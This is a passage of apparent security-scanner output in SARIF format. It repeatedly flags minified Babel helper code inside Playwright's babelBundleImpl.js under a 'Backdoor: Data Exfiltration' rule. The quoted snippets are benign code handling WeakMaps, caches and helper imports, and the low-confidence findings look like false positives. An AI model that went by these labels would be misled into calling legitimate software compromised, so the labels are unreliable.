                      "markdown": "`Each((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\");Object.keys(m).forEach(O=>{d.sc`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 2706,
                  "endLine": 1635,
                  "endColumn": 2711,
                  "snippet": {
                    "text": "t,p={};a.forEach((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\");Object.keys(m).forE",
                    "rendered": {
                      "text": "t,p={};a.forEach((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\");Object.keys(m).forE",
                      "markdown": "`t,p={};a.forEach((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\");Object.keys(m).forE`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 2685,
                  "endLine": 1635,
                  "endColumn": 2690,
                  "snippet": {
                    "text": "ces:c,importPaths:f}=t,p={};a.forEach((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\"",
                    "rendered": {
                      "text": "ces:c,importPaths:f}=t,p={};a.forEach((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\"",
                      "markdown": "`ces:c,importPaths:f}=t,p={};a.forEach((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 2665,
                  "endLine": 1635,
                  "endColumn": 2670,
                  "snippet": {
                    "text": "mportBindingsReferences:c,importPaths:f}=t,p={};a.forEach((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpe",
                    "rendered": {
                      "text": "mportBindingsReferences:c,importPaths:f}=t,p={};a.forEach((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpe",
                      "markdown": "`mportBindingsReferences:c,importPaths:f}=t,p={};a.forEach((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpe`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 1600,
                  "endLine": 1635,
                  "endColumn": 1605,
                  "snippet": {
                    "text": "gram(f){let p=f.scope.getAllBindings();Object.keys(p).forEach(m=>{m!==s&&(n.has(p[m].identifier)||r.add(m))})},ReferencedIdentifier(f){let p=f.node.name,m=f.scope.getBinding(p);m?n.has(m.identifier)&&l.push(cc(f)):(p!==\"arguments\"||f.scope.path.isProgram())&&t.add(p)},AssignmentExpression(f){let p=f.get(\"left\");if(!(s in p.getBindingIdentifiers()))return;if(!p.isIdentifier())throw p.buildCodeFrameError(\"Only simple assignments to exports are allowed in helpers\");let m=f.scope.getBinding(s);m!=null&&m.scope.path.isProgram()&&a.push(cc(f))}};if((0,S0.default)(e.ast,u,e.scope),(0,S0.default)(e.ast,c,e",
                    "rendered": {
                      "text": "gram(f){let p=f.scope.getAllBindings();Object.keys(p).forEach(m=>{m!==s&&(n.has(p[m].identifier)||r.add(m))})},ReferencedIdentifier(f){let p=f.node.name,m=f.scope.getBinding(p);m?n.has(m.identifier)&&l.push(cc(f)):(p!==\"arguments\"||f.scope.path.isProgram())&&t.add(p)},AssignmentExpression(f){let p=f.get(\"left\");if(!(s in p.getBindingIdentifiers()))return;if(!p.isIdentifier())throw p.buildCodeFrameError(\"Only simple assignments to exports are allowed in helpers\");let m=f.scope.getBinding(s);m!=null&&m.scope.path.isProgram()&&a.push(cc(f))}};if((0,S0.default)(e.ast,u,e.scope),(0,S0.default)(e.ast,c,e",
                      "markdown": "`gram(f){let p=f.scope.getAllBindings();Object.keys(p).forEach(m=>{m!==s&&(n.has(p[m].identifier)||r.add(m))})},ReferencedIdentifier(f){let p=f.node.name,m=f.scope.getBinding(p);m?n.has(m.identifier)&&l.push(cc(f)):(p!==\"arguments\"||f.scope.path.isProgram())&&t.add(p)},AssignmentExpression(f){let p=f.get(\"left\");if(!(s in p.getBindingIdentifiers()))return;if(!p.isIdentifier())throw p.buildCodeFrameError(\"Only simple assignments to exports are allowed in helpers\");let m=f.scope.getBinding(s);m!=null&&m.scope.path.isProgram()&&a.push(cc(f))}};if((0,S0.default)(e.ast,u,e.scope),(0,S0.default)(e.ast,c,e`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 871,
                  "endLine": 1635,
                  "endColumn": 876,
                  "snippet": {
                    "text": "hrow f.buildCodeFrameError(`Unknown helper ${p}`);if(f.get(\"specifiers\").length!==1||!f.get(\"specifiers.0\").isImportDefaultSpecifier())throw f.buildCodeFrameError(\"Helpers can only import a default value\");let m=f.node.specifiers[0].local;n.set(m,p),o.push(cc(f))},ExportDefaultDeclaration(f){let p=f.get(\"declaration\");if(!p.isFunctionDeclaration()||!p.node.id)throw p.buildCodeFrameError(\"Helpers can only export named function declarations\");s=p.node.id.name,i=cc(f)},ExportAllDeclaration(f){throw f.buildCodeFrameError(\"Helpers can only export default\")},ExportNamedDeclaration(f){throw f.buildCodeFra",
                    "rendered": {
                      "text": "hrow f.buildCodeFrameError(`Unknown helper ${p}`);if(f.get(\"specifiers\").length!==1||!f.get(\"specifiers.0\").isImportDefaultSpecifier())throw f.buildCodeFrameError(\"Helpers can only import a default value\");let m=f.node.specifiers[0].local;n.set(m,p),o.push(cc(f))},ExportDefaultDeclaration(f){let p=f.get(\"declaration\");if(!p.isFunctionDeclaration()||!p.node.id)throw p.buildCodeFrameError(\"Helpers can only export named function declarations\");s=p.node.id.name,i=cc(f)},ExportAllDeclaration(f){throw f.buildCodeFrameError(\"Helpers can only export default\")},ExportNamedDeclaration(f){throw f.buildCodeFra",
                      "markdown": "`hrow f.buildCodeFrameError(`Unknown helper ${p}`);if(f.get(\"specifiers\").length!==1||!f.get(\"specifiers.0\").isImportDefaultSpecifier())throw f.buildCodeFrameError(\"Helpers can only import a default value\");let m=f.node.specifiers[0].local;n.set(m,p),o.push(cc(f))},ExportDefaultDeclaration(f){let p=f.get(\"declaration\");if(!p.isFunctionDeclaration()||!p.node.id)throw p.buildCodeFrameError(\"Helpers can only export named function declarations\");s=p.node.id.name,i=cc(f)},ExportAllDeclaration(f){throw f.buildCodeFrameError(\"Helpers can only export default\")},ExportNamedDeclaration(f){throw f.buildCodeFra`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 658,
                  "endLine": 1635,
                  "endColumn": 663,
                  "snippet": {
                    "text": "push(e.key),e.inList&&t.push(e.listKey);return t.reverse().join(\".\")}var fc;function IC(e){let t=new Set,r=new Set,n=new Map,s,i,a=[],o=[],l=[],u={ImportDeclaration(f){let p=f.node.source.value;if(!x0.default[p])throw f.buildCodeFrameError(`Unknown helper ${p}`);if(f.get(\"specifiers\").length!==1||!f.get(\"specifiers.0\").isImportDefaultSpecifier())throw f.buildCodeFrameError(\"Helpers can only import a default value\");let m=f.node.specifiers[0].local;n.set(m,p),o.push(cc(f))},ExportDefaultDeclaration(f){let p=f.get(\"declaration\");if(!p.isFunctionDeclaration()||!p.node.id)throw p.buildCodeFrameError(\"H",
                    "rendered": {
                      "text": "push(e.key),e.inList&&t.push(e.listKey);return t.reverse().join(\".\")}var fc;function IC(e){let t=new Set,r=new Set,n=new Map,s,i,a=[],o=[],l=[],u={ImportDeclaration(f){let p=f.node.source.value;if(!x0.default[p])throw f.buildCodeFrameError(`Unknown helper ${p}`);if(f.get(\"specifiers\").length!==1||!f.get(\"specifiers.0\").isImportDefaultSpecifier())throw f.buildCodeFrameError(\"Helpers can only import a default value\");let m=f.node.specifiers[0].local;n.set(m,p),o.push(cc(f))},ExportDefaultDeclaration(f){let p=f.get(\"declaration\");if(!p.isFunctionDeclaration()||!p.node.id)throw p.buildCodeFrameError(\"H",
                      "markdown": "`push(e.key),e.inList&&t.push(e.listKey);return t.reverse().join(\".\")}var fc;function IC(e){let t=new Set,r=new Set,n=new Map,s,i,a=[],o=[],l=[],u={ImportDeclaration(f){let p=f.node.source.value;if(!x0.default[p])throw f.buildCodeFrameError(`Unknown helper ${p}`);if(f.get(\"specifiers\").length!==1||!f.get(\"specifiers.0\").isImportDefaultSpecifier())throw f.buildCodeFrameError(\"Helpers can only import a default value\");let m=f.node.specifiers[0].local;n.set(m,p),o.push(cc(f))},ExportDefaultDeclaration(f){let p=f.get(\"declaration\");if(!p.isFunctionDeclaration()||!p.node.id)throw p.buildCodeFrameError(\"H`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 625,
                  "endLine": 1635,
                  "endColumn": 630,
                  "snippet": {
                    "text": "r(;e.parentPath;e=e.parentPath)t.push(e.key),e.inList&&t.push(e.listKey);return t.reverse().join(\".\")}var fc;function IC(e){let t=new Set,r=new Set,n=new Map,s,i,a=[],o=[],l=[],u={ImportDeclaration(f){let p=f.node.source.value;if(!x0.default[p])throw f.buildCodeFrameError(`Unknown helper ${p}`);if(f.get(\"specifiers\").length!==1||!f.get(\"specifiers.0\").isImportDefaultSpecifier())throw f.buildCodeFrameError(\"Helpers can only import a default value\");let m=f.node.specifiers[0].local;n.set(m,p),o.push(cc(f))},ExportDefaultDeclaration(f){let p=f.get(\"declaration\");if(!p.isFunctionDeclaration()||!p.node.",
                    "rendered": {
                      "text": "r(;e.parentPath;e=e.parentPath)t.push(e.key),e.inList&&t.push(e.listKey);return t.reverse().join(\".\")}var fc;function IC(e){let t=new Set,r=new Set,n=new Map,s,i,a=[],o=[],l=[],u={ImportDeclaration(f){let p=f.node.source.value;if(!x0.default[p])throw f.buildCodeFrameError(`Unknown helper ${p}`);if(f.get(\"specifiers\").length!==1||!f.get(\"specifiers.0\").isImportDefaultSpecifier())throw f.buildCodeFrameError(\"Helpers can only import a default value\");let m=f.node.specifiers[0].local;n.set(m,p),o.push(cc(f))},ExportDefaultDeclaration(f){let p=f.get(\"declaration\");if(!p.isFunctionDeclaration()||!p.node.",
                      "markdown": "`r(;e.parentPath;e=e.parentPath)t.push(e.key),e.inList&&t.push(e.listKey);return t.reverse().join(\".\")}var fc;function IC(e){let t=new Set,r=new Set,n=new Map,s,i,a=[],o=[],l=[],u={ImportDeclaration(f){let p=f.node.source.value;if(!x0.default[p])throw f.buildCodeFrameError(`Unknown helper ${p}`);if(f.get(\"specifiers\").length!==1||!f.get(\"specifiers.0\").isImportDefaultSpecifier())throw f.buildCodeFrameError(\"Helpers can only import a default value\");let m=f.node.specifiers[0].local;n.set(m,p),o.push(cc(f))},ExportDefaultDeclaration(f){let p=f.get(\"declaration\");if(!p.isFunctionDeclaration()||!p.node.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 299,
                  "startColumn": 44,
                  "endLine": 299,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        throw new TypeError(\"Super expression must either be null or a function\");\n      }\n      if (typeof _cache !== \"undefined\") {\n        if (_cache.has(Class)) return _cache.get(Class);\n        _cache.set(Class, Wrapper);\n      }\n      function Wrapper() {\n",
                    "rendered": {
                      "text": "        throw new TypeError(\"Super expression must either be null or a function\");\n      }\n      if (typeof _cache !== \"undefined\") {\n        if (_cache.has(Class)) return _cache.get(Class);\n        _cache.set(Class, Wrapper);\n      }\n      function Wrapper() {\n",
                      "markdown": "`        throw new TypeError(\"Super expression must either be null or a function\");\n      }\n      if (typeof _cache !== \"undefined\") {\n        if (_cache.has(Class)) return _cache.get(Class);\n        _cache.set(Class, Wrapper);\n      }\n      function Wrapper() {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 10990,
                  "endLine": 67,
                  "endColumn": 10995,
                  "snippet": {
                    "text": ",Object.create(null))}return inherits(BabelRegExp,RegExp),BabelRegExp.prototype.exec=function(r){var t=e.exec.call(this,r);if(t){t.groups=buildGroups(t,this);var p=t.indices;p&&(p.groups=buildGroups(p,this))}return t},BabelRegExp.prototype[Symbol.replace]=function(t,p){if(\"string\"==typeof p){var o=r.get(this);return e[Symbol.replace].call(this,t,p.replace(/\\\\$<([^>]+)>/g,(function(e,r){var t=o[r];return\"$\"+(Array.isArray(t)?t.join(\"$\"):t)})))}if(\"function\"==typeof p){var i=this;return e[Symbol.replace].call(this,t,(function(){var e=arguments;return\"object\"!=typeof e[e.length-1]&&(e=[].slice.call(e)",
                    "rendered": {
                      "text": ",Object.create(null))}return inherits(BabelRegExp,RegExp),BabelRegExp.prototype.exec=function(r){var t=e.exec.call(this,r);if(t){t.groups=buildGroups(t,this);var p=t.indices;p&&(p.groups=buildGroups(p,this))}return t},BabelRegExp.prototype[Symbol.replace]=function(t,p){if(\"string\"==typeof p){var o=r.get(this);return e[Symbol.replace].call(this,t,p.replace(/\\\\$<([^>]+)>/g,(function(e,r){var t=o[r];return\"$\"+(Array.isArray(t)?t.join(\"$\"):t)})))}if(\"function\"==typeof p){var i=this;return e[Symbol.replace].call(this,t,(function(){var e=arguments;return\"object\"!=typeof e[e.length-1]&&(e=[].slice.call(e)",
                      "markdown": "`,Object.create(null))}return inherits(BabelRegExp,RegExp),BabelRegExp.prototype.exec=function(r){var t=e.exec.call(this,r);if(t){t.groups=buildGroups(t,this);var p=t.indices;p&&(p.groups=buildGroups(p,this))}return t},BabelRegExp.prototype[Symbol.replace]=function(t,p){if(\"string\"==typeof p){var o=r.get(this);return e[Symbol.replace].call(this,t,p.replace(/\\\\$<([^>]+)>/g,(function(e,r){var t=o[r];return\"$\"+(Array.isArray(t)?t.join(\"$\"):t)})))}if(\"function\"==typeof p){var i=this;return e[Symbol.replace].call(this,t,(function(){var e=arguments;return\"object\"!=typeof e[e.length-1]&&(e=[].slice.call(e)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 10519,
                  "endLine": 67,
                  "endColumn": 10524,
                  "snippet": {
                    "text": " from\"inherits\";export default function _wrapRegExp(){_wrapRegExp=function(e,r){return new BabelRegExp(e,void 0,r)};var e=RegExp.prototype,r=new WeakMap;function BabelRegExp(e,t,p){var o=RegExp(e,t);return r.set(o,p||r.get(e)),setPrototypeOf(o,BabelRegExp.prototype)}function buildGroups(e,t){var p=r.get(t);return Object.keys(p).reduce((function(r,t){var o=p[t];if(\"number\"==typeof o)r[t]=e[o];else{for(var i=0;void 0===e[o[i]]&&i+1<o.length;)i++;r[t]=e[o[i]]}return r}),Object.create(null))}return inherits(BabelRegExp,RegExp),BabelRegExp.prototype.exec=function(r){var t=e.exec.call(this,r);if(t){t.gro",
                    "rendered": {
                      "text": " from\"inherits\";export default function _wrapRegExp(){_wrapRegExp=function(e,r){return new BabelRegExp(e,void 0,r)};var e=RegExp.prototype,r=new WeakMap;function BabelRegExp(e,t,p){var o=RegExp(e,t);return r.set(o,p||r.get(e)),setPrototypeOf(o,BabelRegExp.prototype)}function buildGroups(e,t){var p=r.get(t);return Object.keys(p).reduce((function(r,t){var o=p[t];if(\"number\"==typeof o)r[t]=e[o];else{for(var i=0;void 0===e[o[i]]&&i+1<o.length;)i++;r[t]=e[o[i]]}return r}),Object.create(null))}return inherits(BabelRegExp,RegExp),BabelRegExp.prototype.exec=function(r){var t=e.exec.call(this,r);if(t){t.gro",
                      "markdown": "` from\"inherits\";export default function _wrapRegExp(){_wrapRegExp=function(e,r){return new BabelRegExp(e,void 0,r)};var e=RegExp.prototype,r=new WeakMap;function BabelRegExp(e,t,p){var o=RegExp(e,t);return r.set(o,p||r.get(e)),setPrototypeOf(o,BabelRegExp.prototype)}function buildGroups(e,t){var p=r.get(t);return Object.keys(p).reduce((function(r,t){var o=p[t];if(\"number\"==typeof o)r[t]=e[o];else{for(var i=0;void 0===e[o[i]]&&i+1<o.length;)i++;r[t]=e[o[i]]}return r}),Object.create(null))}return inherits(BabelRegExp,RegExp),BabelRegExp.prototype.exec=function(r){var t=e.exec.call(this,r);if(t){t.gro`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 10437,
                  "endLine": 67,
                  "endColumn": 10442,
                  "snippet": {
                    "text": "wrapRegExp:ze(\"7.19.0\",'import setPrototypeOf from\"setPrototypeOf\";import inherits from\"inherits\";export default function _wrapRegExp(){_wrapRegExp=function(e,r){return new BabelRegExp(e,void 0,r)};var e=RegExp.prototype,r=new WeakMap;function BabelRegExp(e,t,p){var o=RegExp(e,t);return r.set(o,p||r.get(e)),setPrototypeOf(o,BabelRegExp.prototype)}function buildGroups(e,t){var p=r.get(t);return Object.keys(p).reduce((function(r,t){var o=p[t];if(\"number\"==typeof o)r[t]=e[o];else{for(var i=0;void 0===e[o[i]]&&i+1<o.length;)i++;r[t]=e[o[i]]}return r}),Object.create(null))}return inherits(BabelRegExp,Re",
                    "rendered": {
                      "text": "wrapRegExp:ze(\"7.19.0\",'import setPrototypeOf from\"setPrototypeOf\";import inherits from\"inherits\";export default function _wrapRegExp(){_wrapRegExp=function(e,r){return new BabelRegExp(e,void 0,r)};var e=RegExp.prototype,r=new WeakMap;function BabelRegExp(e,t,p){var o=RegExp(e,t);return r.set(o,p||r.get(e)),setPrototypeOf(o,BabelRegExp.prototype)}function buildGroups(e,t){var p=r.get(t);return Object.keys(p).reduce((function(r,t){var o=p[t];if(\"number\"==typeof o)r[t]=e[o];else{for(var i=0;void 0===e[o[i]]&&i+1<o.length;)i++;r[t]=e[o[i]]}return r}),Object.create(null))}return inherits(BabelRegExp,Re",
                      "markdown": "`wrapRegExp:ze(\"7.19.0\",'import setPrototypeOf from\"setPrototypeOf\";import inherits from\"inherits\";export default function _wrapRegExp(){_wrapRegExp=function(e,r){return new BabelRegExp(e,void 0,r)};var e=RegExp.prototype,r=new WeakMap;function BabelRegExp(e,t,p){var o=RegExp(e,t);return r.set(o,p||r.get(e)),setPrototypeOf(o,BabelRegExp.prototype)}function buildGroups(e,t){var p=r.get(t);return Object.keys(p).reduce((function(r,t){var o=p[t];if(\"number\"==typeof o)r[t]=e[o];else{for(var i=0;void 0===e[o[i]]&&i+1<o.length;)i++;r[t]=e[o[i]]}return r}),Object.create(null))}return inherits(BabelRegExp,Re`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 73968,
                  "endLine": 66,
                  "endColumn": 73973,
                  "snippet": {
